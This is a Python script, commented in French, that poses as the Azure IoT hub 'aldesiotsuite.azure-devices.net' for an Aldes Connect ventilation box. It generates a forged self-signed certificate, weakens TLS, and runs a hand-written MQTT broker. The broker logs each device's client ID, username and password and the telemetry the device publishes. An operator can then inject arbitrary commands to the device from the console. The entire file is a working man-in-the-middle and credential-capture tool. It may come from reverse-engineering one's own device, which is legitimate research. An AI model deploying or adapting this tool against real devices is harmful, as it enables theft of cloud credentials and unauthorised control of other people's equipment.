import socket, ssl, struct, threading, json, sys, select
from datetime import datetime, timedelta
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

HOST, PORT = "0.0.0.0", 8883
SERVER_CN = "aldesiotsuite.azure-devices.net"
print("[*] Generation certificat TLS ...")
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, SERVER_CN)])
cert = (
    x509.CertificateBuilder().subject_name(name).issuer_name(name)
    .public_key(key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(datetime.utcnow())
    .not_valid_after(datetime.utcnow() + timedelta(days=3650))
    .add_extension(
        x509.SubjectAlternativeName([x509.DNSName(SERVER_CN)]),
        critical=False,
    )
    .sign(key, hashes.SHA256())
)
with open("/tmp/fake.crt", "wb") as f: f.write(cert.public_bytes(serialization.Encoding.PEM))
with open("/tmp/fake.key", "wb") as f: f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
print("[*] Certificat OK")

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("/tmp/fake.crt", "/tmp/fake.key")
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    ctx.minimum_version = ssl.TLSVersion.TLSv1
except (AttributeError, ValueError):
    pass
try:
    ctx.set_ciphers("ALL:@SECLEVEL=0")
except ssl.SSLError:
    pass

def ps(b, o):
    n = struct.unpack_from(">H", b, o)[0]; return b[o+2:o+2+n].decode(), o+2+n

def es(s):
    b = s.encode("utf-8")
    return struct.pack(">H", len(b)) + b

# session tracking
cur_cid = [None]
cur_sock = [None]
cur_lock = threading.Lock()

def send_to_client(topic, payload):
    with cur_lock:
        s = cur_sock[0]
        if not s:
            print("[!] Pas de session active pour envoyer la commande")
            return
        payload_bytes = payload.encode() if isinstance(payload, str) else payload
        pkt_id = 1  # QoS 1
        body = es(topic) + struct.pack(">H", pkt_id) + payload_bytes
        rl = len(body)
        rle = bytes([rl]) if rl < 128 else bytes([rl & 0x7F | 0x80, rl >> 7])
        pkt = bytes([0x32]) + rle + body  # 0x32 = PUBLISH QoS 1
        try:
            s.sendall(pkt)
            print("[>] Commande envoyee sur %s (%d octets) QoS1" % (topic, len(payload_bytes)))
        except Exception as e:
            print("[!] Erreur envoi commande: %s" % e)

def stdin_thread():
    while True:
        r, _, _ = select.select([sys.stdin], [], [], 1)
        if r:
            line = sys.stdin.readline().strip()
            if not line:
                continue
            if line.startswith("send "):
                rest = line[5:]
                if " " in rest:
                    t, payload = rest.split(" ", 1)
                    send_to_client(t, payload)
                else:
                    print("[!] Usage: send <topic> <payload>")
            elif line == "status":
                with cur_lock:
                    print("[i] Session active: client_id=%s" % cur_cid[0])
            else:
                print("[!] Commandes: send <topic> <payload>, status")

threading.Thread(target=stdin_thread, daemon=True).start()

def hdl(c, a):
    print("\n[+] CONNEXION de", a)
    cid = None
    last_activity = datetime.now()
    try:
        while True:
            r, _, _ = select.select([c], [], [], 30)
            if not r:
                idle = (datetime.now() - last_activity).seconds
                print("  [IDLE %ds] toujours connecte" % idle)
                continue
            hb = c.recv(1)
            if not hb: break
            last_activity = datetime.now()
            pt = (hb[0] >> 4) & 0xF
            m, v = 1, 0
            for _ in range(4):
                b = c.recv(1)
                if not b: raise Exception("EOF")
                v += (b[0] & 0x7F)*m
                if not (b[0] & 0x80): break
                m *= 128
            pl = b""
            while len(pl) < v: pl += c.recv(v - len(pl))
            if pt == 1:
                proto, o = ps(pl, 0); level = pl[o]; cflags = pl[o+1]
                keepalive = struct.unpack_from(">H", pl, o+2)[0]; o += 4
                cid, o = ps(pl, o); un = pw = ""
                if cflags & 0x80: un, o = ps(pl, o)
                if cflags & 0x40:
                    pwlen = struct.unpack_from(">H", pl, o)[0]
                    pw = pl[o+2:o+2+pwlen].decode(errors='replace')[:60]
                print("  [CONNECT] proto=%s level=%d keepalive=%d cflags=0x%02X" % (proto, level, keepalive, cflags))
                print("    client_id=%s username=%s password=%s" % (cid, un or "(none)", pw or "(none)"))
                c.sendall(bytes([0x20, 0x02, 0x00, 0x00]))
                with cur_lock:
                    cur_cid[0] = cid; cur_sock[0] = c
                print("  [i] Session enregistree, vous pouvez injecter des commandes")
            elif pt == 3:
                t, o = ps(pl, 0); qos = (hb[0] & 0xF) >> 1 & 3
                if qos: o += 2
                msg = pl[o:]
                print("  [PUBLISH] topic=%s (%d octets)" % (t, len(msg)))
                try:
                    j = json.loads(msg)
                    print("    " + json.dumps(j, indent=2))
                except:
                    print("    raw=%s" % msg[:500])
            elif pt == 8:
                pkt_id = struct.unpack_from(">H", pl, 0)[0]
                o = 2; topics = []
                while o < len(pl):
                    t, o = ps(pl, o); qos = pl[o]; o += 1
                    topics.append((t, qos))
                print("  [SUBSCRIBE] pkt_id=%d" % pkt_id)
                for t, q in topics:
                    print("    topic=%s qos=%d" % (t, q))
                body = struct.pack(">H", pkt_id) + bytes([min(q, 2) for _, q in topics])
                rl = len(body)
                rle = bytes([rl]) if rl < 128 else bytes([rl & 0x7F | 0x80, rl >> 7])
                c.sendall(bytes([0x90]) + rle + body)
                # Auto-send disabled — manual commands via stdin only
                pass
            elif pt == 4:
                pkt_id = struct.unpack_from(">H", pl, 0)[0]
                print("  [PUBACK] pkt_id=%d" % pkt_id)
            elif pt == 12:
                c.sendall(bytes([0xD0, 0x00]))
                print("  [PINGREQ]")
            elif pt == 14:
                print("  [DISCONNECT]"); break
            else:
                print("  [PTYPE=%d] flags=0x%X len=%d data=%s" % (pt, hb[0] & 0xF, len(pl), pl[:80].hex()))
    except Exception as e:
        print("  [ERREUR] %s" % e)
        import traceback
        traceback.print_exc()
    finally:
        with cur_lock:
            if cur_cid[0] == cid:
                cur_cid[0] = None; cur_sock[0] = None
        try: c.close()
        except: pass

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((HOST, PORT)); sock.listen(5)
print("[*] Ecoute sur %s:%d (TLS)" % (HOST, PORT))
print("[*] Commande disponible: send <topic> <payload>")
print("[*] Redemarre la box Aldes Connect maintenant !")
while True:
    try:
        c, a = sock.accept()
        cs = ctx.wrap_socket(c, server_side=True)
        threading.Thread(target=hdl, args=(cs, a), daemon=True).start()
    except Exception as e:
        print("[!] Erreur accept: %s" % e)
        try: c.close()
        except: pass
